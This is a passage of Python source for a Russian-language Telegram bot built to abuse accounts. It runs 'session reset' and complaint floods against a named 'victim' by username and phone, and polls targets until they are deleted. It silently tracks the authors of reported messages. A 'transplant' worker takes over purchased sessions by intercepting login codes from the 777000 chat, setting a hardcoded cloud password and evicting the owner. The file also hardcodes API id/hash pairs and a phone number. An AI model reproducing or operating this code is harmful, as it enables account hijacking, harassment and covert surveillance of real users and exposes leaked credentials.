    lines.append("\n\u2500\u2500\u2500 Web support \u2500\u2500\u2500")
    ws_ok = 0
    for d in res.get("support", []):
        mark = "\u2705" if d["ok"] else "\u274c"
        err = f" | {d['err']}" if d.get("err") else ""
        lines.append(f"{mark} {d.get('name', '?')} | {d.get('proxy', '-')}{err}")
        ws_ok += 1 if d["ok"] else 0
    ws_total = len(res.get("support", []))

    lines.append("")
    lines.append(f"\u0418\u0442\u043e\u0433: SendCode {sc_ok}/{sc_total} | OAuth {oa_ok}/{oa_total} | Support {ws_ok}/{ws_total}")
    log_path.write_text("\n".join(lines), encoding="utf-8")

    # ── final message ──
    v = res["victim"]
    head = ("\u2705 <b>\u0417\u0430\u043f\u0443\u0449\u0435\u043d\u043e</b>" if v["ok"]
            else "\u274c <b>\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c</b>")
    text = (
        bq(f"<b>{NAME}</b>  \u2014  \U0001f480 \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439")
        + "\n\n" + head + "\n\n"
        + f"\U0001f3af <b>@</b>{html_mod.escape(username)}\n"
        + f"\U0001f4f1 <code>{phone}</code>\n\n"
        + f"\U0001f50d \u0416\u0435\u0440\u0442\u0432\u0430: "
        + (f"<code>{html_mod.escape(str(v['id']))}</code>" if v["ok"] else "<i>" + html_mod.escape(v["error"]) + "</i>") + "\n"
        + f"\U0001f4f2 SendCode: <b>\u0433\u043e\u0442\u043e\u0432\u043e</b>\n"
        + f"\U0001f310 OAuth: <b>\u0433\u043e\u0442\u043e\u0432\u043e</b>\n"
        + f"\U0001f4e8 Support: <b>\u0433\u043e\u0442\u043e\u0432\u043e</b>\n"
        + f"\U0001f552 {datetime.now().strftime('%H:%M:%S')}"
    )
    if v["ok"]:
        text += "\n\n\U0001f50d \u041c\u043e\u043d\u0438\u0442\u043e\u0440\u0438\u043d\u0433 \u0437\u0430\u043f\u0449\u0435\u043d (\u043a\u0430\u0436\u0434\u044b\u0435 10 \u043c\u0438\u043d)"
    try:
        await cb.message.delete()
    except Exception:
        pass
    await send_hero(
        cb.message, caption=_cx(text),
        parse_mode=ParseMode.HTML, reply_markup=kb_main(cb.from_user.id))

    await cb.message.answer_document(
        document=FSInputFile(log_path),
        caption="\U0001f4c4 \u041b\u043e\u0433",
        reply_markup=kb_main(cb.from_user.id),
    )

    if v["ok"]:
        asyncio.create_task(snos_monitor_loop(
            username, v["id"], v["has_photo"], v["about"],
            cb.bot, cb.from_user.id,
        ))

    await state.clear()
# ── report flow ─────────────────────────────────────────
# ── watchdog: цели под наблюдением ──────────────────────
class WatchFSM(StatesGroup):
    enter = State()


WATCH_FILE = Path(__file__).parent / "watchdog.json"
WATCH_INTERVAL = 150        # один проход каждые 2.5 мин (окно рана ~5 мин)
WATCH_START_DELAY = 45
WATCH_MAX_PER_USER = 200
WATCH_DEFAULT_DAYS = 3
WATCH_SESS_CAP = 5          # параллельные пробы

_watch_sem = asyncio.Semaphore(WATCH_SESS_CAP)


def load_watch() -> dict:
    try:
        return json.loads(WATCH_FILE.read_text(encoding="utf-8"))
    except Exception:
        return {"seq": 0, "items": []}


def save_watch(d: dict, force: bool = False) -> None:
    WATCH_FILE.write_text(json.dumps(d, ensure_ascii=False, indent=1),
                          encoding="utf-8")
    commit_file_to_repo("watchdog.json", "watchdog update",
                        cooldown=0 if force else 90)
    try:
        store.push_async("watchdog", WATCH_FILE.read_text(encoding="utf-8"),
                         force=force)
    except Exception:
        pass


def _watch_add(uid: int, raw: str) -> tuple[dict | None, str]:
    d = load_watch()
    mine = [it for it in d["items"] if it["uid"] == uid]
    if len(mine) >= WATCH_MAX_PER_USER:
        return None, f"лимит: {WATCH_MAX_PER_USER} целей на юзера"
    tgt = (raw or "").strip()
    if not tgt:
        return None, "пусто"
    low = tgt.lower()
    if low.startswith(("http://", "https://")) and "t.me" not in low:
        kind, entity, msg_id = "url", tgt, None
    elif "t.me/+" in tgt or "joinchat/" in tgt:
        h = (tgt.split("+")[-1].split("/")[-1].split("?")[0]
             if "t.me/+" in tgt
             else tgt.split("joinchat/")[-1].split("?")[0])
        kind, entity, msg_id = "invite", h, None
    else:
        t = parse_target(tgt)
        if not t["entity"]:
            return None, "не разобрал цель"
        kind, entity, msg_id = "entity", t["entity"], t.get("msg_id")
    for it in d["items"]:
        if it["uid"] == uid and it["entity"] == entity and it["kind"] == kind:
            return it, "уже под наблюдением"
    d["seq"] = d.get("seq", 0) + 1
    item = {"id": d["seq"], "uid": uid, "kind": kind, "entity": entity,
            "msg_id": msg_id, "raw": tgt, "status": "alive",
            "until": time.time() + WATCH_DEFAULT_DAYS * 86400}
    d["items"].append(item)
    save_watch(d, force=True)
    return item, "ok"


def _watch_remove_one(uid: int, raw: str) -> int:
    d = load_watch()
    keep = [it for it in d["items"]
            if not (it.get("uid") == uid
                    and str(it.get("raw") or "") == str(raw or ""))]
    removed = len(d["items"]) - len(keep)
    if removed:
        d["items"] = keep
        save_watch(d, force=True)
    return removed


def _watch_remove_all(uid: int) -> int:
    d = load_watch()
    keep = [it for it in d["items"] if it["uid"] != uid]
    removed = len(d["items"]) - len(keep)
    if removed:
        d["items"] = keep
        save_watch(d, force=True)
    return removed


def _watch_add_sender(uid: int, sender: str, origin: str = "") -> bool:
    """Silently track the complained message's author. No user-facing entry."""
    t = parse_target(sender)
    d = load_watch()
    for it in d["items"]:
        if (it.get("uid") == uid and it.get("admin_only")
                and str(it.get("entity")).lstrip("@").lower()
                == str(t["entity"]).lstrip("@").lower()):
            return False
    d["seq"] = d.get("seq", 0) + 1
    d["items"].append({
        "id": d["seq"], "uid": uid, "kind": "entity",
        "entity": t["entity"], "msg_id": None, "raw": sender,
        "origin": origin, "status": "alive", "admin_only": True,
        "until": time.time() + WATCH_DEFAULT_DAYS * 86400})
    save_watch(d, force=True)
    return True


async def resolve_message_sender(entity, msg_id: int | None) -> str | None:
    """Resolve the author of a complained message via a pool session."""
    from telethon.tl.types import Channel as _SenderChannel, User as _SenderUser
    if not msg_id:
        return None
    sessions = [s for s in load_sessions() if not s.stem.startswith(".")]
    if not sessions:
        return None
    for sess in random.sample(sessions, min(4, len(sessions))):
        client = None
        try:
            fp = session_fingerprint(sess.stem)
            px = pin_for_session(sess.stem, load_pin_proxies())
            client = TelegramClient(
                str(sess.with_suffix("")), fp["api_id"], fp["api_hash"],
                proxy=px, device_model=fp["device"],
                system_version=fp["system_version"],
                app_version=fp["app_version"], lang_code=fp["lang_code"])
            await asyncio.wait_for(client.connect(), timeout=10)
            m = await asyncio.wait_for(
                client.get_messages(entity, ids=msg_id), timeout=15)
            if not m or m.sender_id is None:
                continue
            sender = await asyncio.wait_for(
                client.get_entity(m.sender_id), timeout=15)
            if isinstance(sender, (_SenderUser, _SenderChannel)):
                return (f"@{sender.username}" if getattr(sender, "username", None)
                        else str(sender.id))
        except Exception as e:
            log.warning("sender resolve via %s failed: %s", sess.stem, e)
        finally:
            if client is not None:
                try:
                    await client.disconnect()
                except Exception:
                    pass
    return None


async def fetch_message_body(entity, msg_id: int | None) -> str:
    """Text/caption of the complained message — feeds the AI complaint texts."""
    if not msg_id:
        return ""
    led = _ledger_load()
    sessions = [s for s in load_sessions()
                if not s.stem.startswith(".") and session_usable(s.stem, led)[0]]
    for sess in random.sample(sessions, min(3, len(sessions))):
        client = None
        try:
            fp = session_fingerprint(sess.stem)
            px = pin_for_session(sess.stem, load_pin_proxies())
            client = TelegramClient(
                str(sess.with_suffix("")), fp["api_id"], fp["api_hash"],
                proxy=px, device_model=fp["device"],
                system_version=fp["system_version"],
                app_version=fp["app_version"], lang_code=fp["lang_code"])
            await asyncio.wait_for(client.connect(), timeout=10)
            m = await asyncio.wait_for(
                client.get_messages(entity, ids=msg_id), timeout=15)
            if m:
                return (m.text or m.caption or "")[:600]
        except Exception as e:
            log.warning("message body via %s failed: %s", sess.stem, e)
        finally:
            if client is not None:
                try:
                    await client.disconnect()
                except Exception:
                    pass
    return ""


def _watch_list(uid: int) -> list[dict]:
    now = time.time()
    return [it for it in load_watch()["items"]
            if it["uid"] == uid and not it.get("admin_only")
            and it.get("until", 0) > now]


async def _watch_probe(kind: str, entity: str, msg_id: int | None,
                       sess: Path) -> str:
    """alive | dead | msg_gone | error. Ошибка сети — не событие."""
    from telethon import errors as _wterr
    from telethon.tl.functions.messages import CheckChatInviteRequest
    from telethon.tl.types import User as _WUser
    fp = session_fingerprint(sess.stem)
    proxy = pin_for_session(sess.stem, load_pin_proxies())
    client = TelegramClient(
        str(sess.with_suffix("")), fp["api_id"], fp["api_hash"], proxy=proxy,
        device_model=fp["device"], system_version=fp["system_version"],
        app_version=fp["app_version"], lang_code=fp["lang_code"])
    try:
        await asyncio.wait_for(client.connect(), timeout=10)
        if not await client.is_user_authorized():
            return "error"
        if kind == "invite":
            try:
                await client(CheckChatInviteRequest(hash=entity))
                return "alive"
            except (_wterr.InviteHashExpiredError, _wterr.InviteHashInvalidError,
                    _wterr.ChannelPrivateError):
                return "dead"
            return "error"
        ent = await client.get_entity(entity)
        if isinstance(ent, _WUser):
            if ent.deleted or getattr(ent, "deactivated", False):
                return "dead"
            if msg_id and not ent.bot:
                return "alive"
        if getattr(ent, "deactivated", False):
            return "dead"
        if msg_id:
            try:
                m = await client.get_messages(ent, ids=msg_id)
                return "alive" if m else "msg_gone"
            except Exception:
                return "msg_gone"
        return "alive"
    except (_wterr.UsernameNotOccupiedError, _wterr.UsernameInvalidError,
            _wterr.UserDeactivatedError, _wterr.UserDeactivatedBanError,
            _wterr.ChannelPrivateError):
        return "dead"
    except Exception:
        return "error"
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass


async def _watch_probe_url(url: str) -> str:
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=10),
                             headers={"User-Agent": "Mozilla/5.0"},
                             allow_redirects=True) as r:
                return "dead" if r.status in (404, 410) else "alive"
    except Exception:
        return "error"


async def _watch_check_one(it: dict, sessions: list[Path]) -> tuple[int, str]:
    async with _watch_sem:
        if it["kind"] == "url":
            return it["id"], await _watch_probe_url(it["entity"])
        if not sessions:
            return it["id"], "error"
        sess = random.choice(sessions)
        st = await _watch_probe(it["kind"], it["entity"], it.get("msg_id"), sess)
        return it["id"], st


async def watch_sweep() -> None:
    d = load_watch()
    now = time.time()
    if any(it.get("until", 0) <= now for it in d["items"]):
        d["items"] = [it for it in d["items"] if it.get("until", 0) > now]
        save_watch(d)
    items = list(d["items"])
    if not items:
        return
    sessions = load_sessions()
    outs = await asyncio.gather(
        *[_watch_check_one(it, sessions) for it in items],
        return_exceptions=True)
    events, changed = [], False
    for r in outs:
        if not isinstance(r, tuple):
            continue
        wid, st = r
        if st == "error":
            continue
        cur = next((x for x in d["items"] if x["id"] == wid), None)
        if cur is None:
            continue
        if st == "alive":
            if cur.get("status") != "alive":
                cur["status"] = "alive"
                changed = True
            continue
        d["items"] = [x for x in d["items"] if x["id"] != wid]
        events.append((cur, st))
        changed = True
    if changed:
        save_watch(d, force=True)
    for cur, st in events:
        label = "сообщение удалено" if st == "msg_gone" \
            else "цель удалена / заморожена"
        plain = str(cur.get("raw") or cur["entity"])
        esc = html_mod.escape(plain)
        await push_send_log(
            "Сторож: цель снята",
            [f"🎯 <code>{esc}</code> — {label}",
             f"👤 владелец: <code>{cur['uid']}</code>"])
        if cur.get("admin_only"):
            await push_send_log(
                "Сторож: отправитель удалён",
                [f"\U0001f3af <code>{esc}</code> — "
                  "отправитель сообщения удалён",
                 f"\U0001f4ac сообщение: <code>{html_mod.escape(str(cur.get('origin') or ''))}</code>"])
            continue
        if _BOT:
            try:
                await _BOT.send_message(
                    cur["uid"], _cx(
                        bq(f"<b>{NAME}</b>  —  👁 Сторож")
                        + f"\n\n⚡ <b>Успешное удаление</b>"
                        + f"\n🎯 <code>{esc}</code>"
                        + f"\n🕒 {datetime.now().strftime('%d.%m %H:%M:%S')}"),
                    parse_mode=ParseMode.HTML)
            except Exception:
                pass


async def watch_loop() -> None:
    log.info("watchdog: sweep every %ss", WATCH_INTERVAL)
    await asyncio.sleep(WATCH_START_DELAY)
    while True:
        try:
            await watch_sweep()
        except asyncio.CancelledError:
            return
        except Exception as e:
            log.warning("watchdog sweep failed: %s", e)
        await asyncio.sleep(WATCH_INTERVAL)


def kb_watch() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Добавить цель", callback_data="watch:add")],
        [InlineKeyboardButton(text="📋 Мои цели", callback_data="watch:list"),
         InlineKeyboardButton(text="❌ Снять все", callback_data="watch:clear")],
        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
    ])


def watch_menu_text(uid: int) -> str:
    mine = _watch_list(uid)
    rows = "\n".join(
        f"{'🟢' if it['status'] == 'alive' else '🔴'} "
        f"<code>{html_mod.escape(str(it['raw'])[:60])}</code>"
        for it in mine) or "<i>пусто</i>"
    return (bq(f"<b>{NAME}</b>  —  👁 Сторож")
            + "\n\nСледит за целями и присылает событие, когда цель удалят."
            + f"\n\n<b>Под наблюдением ({len(mine)}/{WATCH_MAX_PER_USER}):</b>\n{rows}")


@router.message(F.text.startswith("/watch"))
async def watch_cmd(msg: Message, state: FSMContext):
    subs = load_subs()
    s, _ = sub_quality(subs, msg.from_user.id)
    if s in ("free", "expired") and not user_is_admin(msg.from_user.id):
        await msg.answer(_cx(
            bq(f"<b>{NAME}</b>") + "\n\n🔒 Сторож доступен с подпиской."),
            parse_mode=ParseMode.HTML)
        return
    await state.clear()
    await msg.answer(_cx(watch_menu_text(msg.from_user.id)),
                     parse_mode=ParseMode.HTML, reply_markup=kb_watch())


@router.callback_query(F.data.startswith("watch:"))
async def watch_menu(cb: CallbackQuery, state: FSMContext):
    act = cb.data.split(":", 1)[1]
    uid = cb.from_user.id
    subs = load_subs()
    s, _ = sub_quality(subs, uid)
    if s in ("free", "expired") and not user_is_admin(uid):
        await cb.answer("🔒 Нужна подписка", show_alert=True)
        return
    if act == "add":
        await safe_edit(cb.message, _cx(
            bq(f"<b>{NAME}</b>  —  👁 Сторож")
            + "\n\n🎯 Пришли цель одним сообщением:"
            + "\n<code>@username</code> · <code>t.me/ссылка</code> · "
              "пригл-ссылка <code>t.me/+...</code> · http-ссылка"),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="watch:menu")],
            ]))
        await state.set_state(WatchFSM.enter)
        await cb.answer()
        return
    if act == "clear":
        n = _watch_remove_all(uid)
        await safe_edit(cb.message, _cx(watch_menu_text(uid)),
                        parse_mode=ParseMode.HTML, reply_markup=kb_watch())
        await cb.answer(f"снято: {n}" if n else "пусто",
                        show_alert=bool(n))
        return
    await safe_edit(cb.message, _cx(watch_menu_text(uid)),
                    parse_mode=ParseMode.HTML, reply_markup=kb_watch())
    await cb.answer()


@router.message(WatchFSM.enter)
async def watch_enter(msg: Message, state: FSMContext):
    item, why = _watch_add(msg.from_user.id, msg.text or "")
    try:
        await msg.delete()
    except Exception:
        pass
    if item is None:
        await msg.answer(_cx(f"❌ {why}"), parse_mode=ParseMode.HTML)
        return
    await msg.answer(_cx(watch_menu_text(msg.from_user.id)),
                     parse_mode=ParseMode.HTML, reply_markup=kb_watch())
    await state.clear()


# ── transplant: lolz-сессии → живые _new-сессии (фоновый воркер) ─────
TRANSPLANT_FOLDER = Path(__file__).parent / "lolz"
TRANSPLANT_READY = Path(__file__).parent / "lolz" / "_ready"
TRANSPLANT_READY.mkdir(parents=True, exist_ok=True)   # SQLite needs the dir
TRANSPLANT_OUT = TRANSPLANT_READY   # ждут подтверждения админа
TRANSPLANT_CLOUD_PASS = "Ali095095"
TRANSPLANT_INTERVAL = 180        # проход каждые 3 мин
TRANSPLANT_START_DELAY = 30
TRANSPLANT_CAP = 5               # параллельные пересадки
TRANSPLANT_CODE_WAIT = 300       # секунд ждём код от 777000
# телефоны, которые воркер не пересаживает и не кикает
TRANSPLANT_EXCLUDE_PHONES = {"917066653092"}
TRANSPLANT_EXCLUDE_STEMS = {"s917066653092"}

_TRANSPLANT_API_PAIRS = [
    (24565698, "5a084b434f8505ace703485b9da85040"),
    (27904162, "e7cba879b1c643ba77490bf328df5eab"),
    (23037915, "50f06f5b2223586fde0d1379ea91ebc7"),
    (29512095, "0b29a7d42fff002856b9bed64f7ec919"),
    (25055016, "25edf5b7becebe91a2d61fe8d9d9931b"),
]

_transplant_sem = asyncio.Semaphore(TRANSPLANT_CAP)


TRANSPLANT_KEEP = TRANSPLANT_FOLDER / "_keep"
TRANSPLANT_DONE = TRANSPLANT_FOLDER / "_done"


def _git_sync(rel_paths: list[str], msg: str, attempts: int = 5) -> bool:
    """Blocking add+commit+pull --rebase+push, verified by exit code.
    True only when the commit is really on origin/main — the transplant
    worker makes no destructive move until this returns True."""
    base = Path(__file__).parent
    for rel in rel_paths:
        try:
            subprocess.run(["git", "add", "-A", "--", rel], cwd=base,
                           timeout=60, check=False, capture_output=True)
        except Exception as e:
            log.warning("git add %s failed: %s", rel, e)
            return False
    r = subprocess.run(["git", "-c", "user.name=arch-bot",
                        "-c", "user.email=arch@users.noreply.github.com",
                        "commit", "-m", msg], cwd=base, timeout=90,
                       check=False, capture_output=True)
    if r.returncode != 0:
        # nothing new to commit — accept only if every path is already
        # tracked in HEAD, otherwise the file never reached the repo
        tracked = subprocess.run(["git", "ls-files", "--error-unmatch",
                                  *rel_paths], cwd=base, timeout=30,
                                 check=False, capture_output=True)
        if tracked.returncode == 0:
            return True
        log.warning("git commit failed for %s: %s", rel_paths,
                    (r.stderr or b"")[:300])
        return False
    for attempt in range(attempts):
        subprocess.run(["git", "-c", "rebase.autoStash=true", "pull",
                        "--rebase", "origin", "main"], cwd=base, timeout=120,
                       check=False, capture_output=True)
        p = subprocess.run(["git", "push", "origin", "HEAD:main"], cwd=base,
                           timeout=90, check=False, capture_output=True)
        if p.returncode == 0:
            log.info("git push ok: %s", msg)
            return True
        log.warning("git push attempt %s failed: %s", attempt + 1,
                    (p.stderr or b"")[:200])
        time.sleep(2 * (attempt + 1))
    log.warning("git push failed after %s attempts: %s", attempts, msg)
    return False


async def _persist_paths(rel_paths: list[str], msg: str) -> bool:
    """Push the given repo paths through the Contents API. No rebase, no
    merge conflicts, one honest ok/fail per file. Falls back to _git_sync
    when the token or repo name is missing (local runs)."""
    tok = os.getenv("GITHUB_TOKEN") or os.getenv("GH_TOKEN")
    repo = os.getenv("GITHUB_REPOSITORY")
    if not (tok and repo):
        return _git_sync(rel_paths, msg)
    headers = {"Authorization": f"Bearer {tok}",
               "Accept": "application/vnd.github+json",
               "X-GitHub-Api-Version": "2022-11-28"}
    base = Path(__file__).parent
    ok = True
    timeout = aiohttp.ClientTimeout(total=45)
    async with aiohttp.ClientSession(timeout=timeout) as s:
        for rel in rel_paths:
            p = base / rel
            url = f"https://api.github.com/repos/{repo}/contents/{rel}"
            done = False
            for attempt in range(3):
                sha = None
                try:
                    async with s.get(url, headers=headers,
                                     params={"ref": "main"}) as r:
                        if r.status == 200:
                            sha = (await r.json(content_type=None)).get("sha")
                except Exception as e:
                    log.warning("api get %s: %s", rel, e)
                try:
                    if p.exists():
                        body = {"message": msg, "branch": "main",
                                "content": base64.b64encode(
                                    p.read_bytes()).decode("ascii")}
                        if sha:
                            body["sha"] = sha
                        async with s.put(url, headers=headers, json=body) as r:
                            if r.status in (200, 201):
                                log.info("api put ok: %s", rel)
                                done = True
                                break
                            log.warning("api put %s -> %s", rel, r.status)
                    else:
                        if not sha:
                            done = True
                            break
                        async with s.delete(url, headers=headers,
                                            json={"message": msg,
                                                  "sha": sha,
                                                  "branch": "main"}) as r:
                            if r.status in (200, 204):
                                log.info("api delete ok: %s", rel)
                                done = True
                                break
                            log.warning("api delete %s -> %s", rel, r.status)
                except Exception as e:
                    log.warning("api persist %s: %s", rel, e)
                await asyncio.sleep(1.5 * (attempt + 1))
            if not done:
                ok = False
    if ok:
        return True
    log.warning("api persist incomplete for %s — git fallback", rel_paths)
    return _git_sync(rel_paths, msg)


def _transplant_file(sess: Path) -> Path:
    """_transplant_list() hands back suffix-less stems (Telethon adds
    .session on connect) — resolve the real file on disk."""
    if sess.suffix == ".session":
        return sess
    cand = Path(str(sess) + ".session")
    return cand if cand.exists() else sess


async def _transplant_backup(sess: Path) -> bool:
    """Copy the source session into lolz/_keep and push it. Runs before the
    reset, so a job that dies mid-flight cannot take the account with it."""
    src = _transplant_file(sess)
    try:
        TRANSPLANT_KEEP.mkdir(parents=True, exist_ok=True)
        dest = TRANSPLANT_KEEP / f"{sess.stem}.session"
        shutil.copy2(src, dest)
    except Exception as e:
        log.warning("transplant backup copy failed: %s", e)
        return False
    rel = str(dest.relative_to(Path(__file__).parent)).replace("\\", "/")
    return await _persist_paths([rel], f"transplant: backup {sess.stem}")


async def _transplant_archive_source(sess: Path) -> None:
    """Move a finished/unusable source out of the lolz pick-up folder so the
    worker stops touching it, and persist the move."""
    base = Path(__file__).parent
    src = _transplant_file(sess)
    try:
        TRANSPLANT_DONE.mkdir(parents=True, exist_ok=True)
        dest = TRANSPLANT_DONE / f"{sess.stem}.session"
        if src.exists():
            shutil.move(str(src), str(dest))
        for ext in (".session-journal", "-journal"):
            Path(str(src) + ext).unlink(missing_ok=True)
    except Exception as e:
        log.warning("transplant archive %s failed: %s", sess.stem, e)
        return
    rels = [str(dest.relative_to(base)).replace("\\", "/"),
            str(src.relative_to(base)).replace("\\", "/")]
    await _persist_paths(rels, f"transplant: {sess.stem} archived")


async def _transplant_drop_source(sess: Path) -> None:
    """Source already spent: remove its .session/.json locally and persist
    the deletion, so the lolz folder holds only real candidates."""
    base = Path(__file__).parent
    src = _transplant_file(sess)
    rels = []
    for p in (src, TRANSPLANT_FOLDER / f"{sess.stem}.json"):
        try:
            rel = str(p.relative_to(base)).replace("\\", "/")
        except ValueError:
            continue
        try:
            p.unlink(missing_ok=True)
        except Exception as e:
            log.warning("transplant %s: unlink failed: %s", sess.stem, e)
        rels.append(rel)
    for ext in (".session-journal", "-journal"):
        Path(str(src) + ext).unlink(missing_ok=True)
    await _persist_paths(rels, f"transplant: {sess.stem} moved out")


async def _admin_send(text: str, kb=None) -> None:
    """Admin notice from wherever the code runs: the bot process has _BOT,
    the transplant workflow builds a short-lived one from the token."""
    if not ADMIN_ID:
        return
    bot = _BOT
    own = False
    if bot is None:
        token = (os.getenv("ARCH_BOT_TOKEN")
                 or os.getenv("BOT_TOKEN") or "").strip()
        if not token:
            log.warning("admin notify skipped: no bot token")
            return
        bot = Bot(token)
        own = True
    try:
        await bot.send_message(int(ADMIN_ID), text, parse_mode=ParseMode.HTML,
                               reply_markup=kb, disable_web_page_preview=True)
    except Exception as e:
        log.warning("admin notify failed: %s", e)
    finally:
        if own:
            try:
                await bot.session.close()
            except Exception:
                pass


async def notify_admin_ready(name: str, phone: str, ready: int) -> None:
    """One message per successful transplant with the pool button."""
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Добавить в пул",
                             icon_custom_emoji_id="5258477770735885832",
                             style="success",
                             callback_data="pool:addready")]])
    await _admin_send(
        bq(f"<b>{NAME}</b>  ·  ✅ Пересадка")
        + f"\n\n<code>{html_mod.escape(name)}_new</code> — +{html_mod.escape(phone)}"
        + "\n🔐 новая сессия на нашем ключе, старая выведена"
        + f"\n📦 ждут подтверждения: <b>{ready}</b>",
        kb)


async def add_ready_to_pool() -> list[str]:
    """Move every verified `lolz/_ready/*_new.session` into the pool, inherit
    the source proxy pin, clear dead/suspect marks, persist all of it."""
    TRANSPLANT_READY.mkdir(parents=True, exist_ok=True)
    moved, rels = [], []
    for src in sorted(TRANSPLANT_READY.glob("*_new.session")):
        dest = SESSIONS_DIR / src.name
        try:
            shutil.move(str(src), str(dest))
        except Exception as e:
            log.warning("pool add %s: move failed: %s", src.stem, e)
            continue
        moved.append(src.stem)
        rels.append(f"sessions/{src.name}")
        js = TRANSPLANT_READY / f"{src.stem}.json"
        if js.exists():
            try:
                shutil.move(str(js), str(SESSIONS_DIR / js.name))
                rels.append(f"sessions/{js.name}")
            except Exception as e:
                log.warning("pool add %s: meta move failed: %s", src.stem, e)
        rels.append(f"lolz/_ready/{src.name}")
        rels.append(f"lolz/_ready/{src.stem}.json")
    if not moved:
        return []
    pins = _load_pins()
    pinned = False
    for name in moved:
        if name in pins:
            continue
        src_pin = pins.get(name[:-4]) if name.endswith("_new") else None
        if src_pin:
            pins[name] = {"url": src_pin.get("url"), "since": int(time.time())}
            pinned = True
    if pinned:
        try:
            SESSION_PIN_FILE.write_text(
                json.dumps(pins, ensure_ascii=False, indent=1), encoding="utf-8")
            rels.append("session_proxy.json")
        except Exception as e:
            log.warning("pool add: pin write failed: %s", e)
    st = _status_load()
    cleared = False
    for key in ("dead", "suspect"):
        lst = st.get(key) or []
        keep = [n for n in lst if n not in moved]
        if len(keep) != len(lst):
            st[key] = keep
            cleared = True
    if cleared:
        try:
            SESSION_STATUS_FILE.write_text(
                json.dumps(st, ensure_ascii=False, indent=1), encoding="utf-8")
            rels.append("session_status.json")
        except Exception as e:
            log.warning("pool add: status write failed: %s", e)
    await _persist_paths(rels, f"pool: add {len(moved)} transplanted")
    log.info("pool: added %s", ", ".join(moved))
    return moved


@router.callback_query(F.data == "pool:addready")
async def pool_add_ready(cb: CallbackQuery):
    if not ADMIN_ID or cb.from_user.id != int(ADMIN_ID):
        await cb.answer()
        return
    await cb.answer()
    moved = await add_ready_to_pool()
    if not moved:
        await safe_edit(cb.message, _cx(
            bq(f"<b>{NAME}</b>  ·  📥 Пул")
            + "\n\nПересаженных сессий в очереди нет."),
            parse_mode=ParseMode.HTML)
        return
    await safe_edit(cb.message, _cx(
        bq(f"<b>{NAME}</b>  ·  📥 Пул пополнен")
        + f"\n\n✅ Добавлено: <b>{len(moved)}</b>\n"
        + "\n".join(f"• <code>{html_mod.escape(n)}</code>" for n in moved)
        + f"\n\n🧷 В пуле сейчас: <b>{len(load_sessions())}</b>"),
        parse_mode=ParseMode.HTML)


TRANSPLANT_QUEUE = Path(__file__).parent / "lolz_queue.json"
TRANSPLANT_RETRY_SEC = 30 * 60      # 30 минут между попытками
TRANSPLANT_MIN_AGE_SEC = 25 * 3600  # Telegram не даёт кикать свежие сессии
LOLZ_AGE_FILE = Path(__file__).parent / "lolz_age.json"


def _age_load() -> dict:
    try:
        return json.loads(LOLZ_AGE_FILE.read_text(encoding="utf-8"))
    except Exception:
        return {}


def _age_save(d: dict) -> None:
    try:
        LOLZ_AGE_FILE.write_text(
            json.dumps(d, ensure_ascii=False, indent=1), encoding="utf-8")
    except Exception as e:
        log.warning("lolz age save failed: %s", e)


def _queue_load() -> dict:
    try:
        return json.loads(TRANSPLANT_QUEUE.read_text(encoding="utf-8"))
    except Exception:
        return {}


def _queue_save(q: dict) -> None:
    try:
        TRANSPLANT_QUEUE.write_text(
            json.dumps(q, ensure_ascii=False, indent=1), encoding="utf-8")
    except Exception as e:
        log.warning("transplant queue save failed: %s", e)


def _transplant_due_list() -> list[Path]:
    """Sources whose cooldown is over. A newly seen source is scheduled
    now+30min and skipped, so a fresh drop never runs on arrival."""
    q = _queue_load()
    ages = _age_load()
    now = time.time()
    due, changed, age_changed = [], False, False
    for sess in _transplant_list():
        born = ages.get(sess.stem)
        if not born:
            ages[sess.stem] = int(now)
            born = ages[sess.stem]
            age_changed = True
            log.info("transplant %s: age tracked from now", sess.stem)
        wait = float(born) + TRANSPLANT_MIN_AGE_SEC - now
        if wait > 0:
            e = q.get(sess.stem) or {}
            e["next_try"] = float(born) + TRANSPLANT_MIN_AGE_SEC
            q[sess.stem] = e
            changed = True
            log.info("transplant %s: too fresh — sits in lolz, %ss left",
                     sess.stem, int(wait))
            continue
        e = q.get(sess.stem)
        if not e:
            q[sess.stem] = {"next_try": now + TRANSPLANT_RETRY_SEC,
                            "tries": 0, "added": int(now)}
            changed = True
            log.info("transplant %s: queued, first try in %ss", sess.stem,
                     TRANSPLANT_RETRY_SEC)
            continue
        left = float(e.get("next_try") or 0) - now
        if left <= 0:
            due.append(sess)
        else:
            log.info("transplant %s: cooling down %ss", sess.stem, int(left))
    if changed:
        _queue_save(q)
    if age_changed:
        _age_save(ages)
    return due


async def _transplant_mark(sess: Path, ok: bool) -> None:
    """Success drops the source from the queue; failure re-arms 30 minutes."""
    q = _queue_load()
    if ok:
        q.pop(sess.stem, None)
    else:
        e = q.get(sess.stem) or {"tries": 0}
        e["tries"] = int(e.get("tries") or 0) + 1
        e["next_try"] = time.time() + TRANSPLANT_RETRY_SEC
        e["last_try"] = int(time.time())
        q[sess.stem] = e
        log.info("transplant %s: failed, retry in %ss (try %s)", sess.stem,
                 TRANSPLANT_RETRY_SEC, e["tries"])
    _queue_save(q)
    await _persist_paths(["lolz_queue.json"], f"transplant queue: {sess.stem}")


def _transplant_list() -> list[Path]:
    """lolz/*.session без суффикса _new."""
    if not TRANSPLANT_FOLDER.exists():
        return []
    return sorted(p.with_suffix("") for p in TRANSPLANT_FOLDER.glob("*.session")
                  if "_new" not in p.stem)


def _transplant_cleanup_partial(path: Path) -> None:
    for ext in (".session", ".session-journal"):
        try:
            Path(str(path) + ext).unlink(missing_ok=True)
        except Exception:
            pass


async def _transplant_read_code(client, timeout: float,
                                after_ts: float | None = None) -> str | None:
    """5–6 digit login code from the 777000 service chat. Live updates are
    the fast path; a polling loop covers runners that never deliver updates."""
    from telethon import events as _tlev
    fut = asyncio.get_running_loop().create_future()
    rx = re.compile(r"\b(\d{5,6})\b")

    def _pick(text: str) -> str | None:
